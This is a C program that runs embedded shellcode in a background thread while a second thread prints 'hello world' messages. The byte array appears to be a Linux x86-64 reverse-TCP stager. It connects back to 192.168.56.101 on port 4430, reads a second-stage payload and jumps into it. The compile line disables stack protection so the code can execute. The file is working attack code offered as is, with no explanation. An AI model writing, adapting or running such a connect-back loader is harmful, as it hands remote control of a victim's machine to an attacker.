#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>


//gcc -pthread -zexecstack -fno-stack-protector ./thread.c -o thread.bin

void *print_message(void *);
void *connect_back(void *);


int main(int argc, char **argv)
{
    unsigned char payload[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x11\x4e\xc0\xa8"
"\x38\x65\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6\x90\x90\x90\x90\x90\x90";

    pthread_t thread1, thread2;
    void *blah = 0;

    pthread_create(&thread1, NULL, print_message, blah);
    pthread_create(&thread2, NULL, connect_back, (void *)payload);

    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);

    return 0;
}

void *print_message(void *msg)
{
    void *blah = 0;
    while (1)
    {
	printf("hello world\n");
	sleep(3);
	printf("goodbye world\n");
	sleep(3);
    }
    return blah;
}

void *connect_back(void *code)
{
    int (*func)() = (int(*)())(unsigned char *)code;
    func();
    return 0;
}
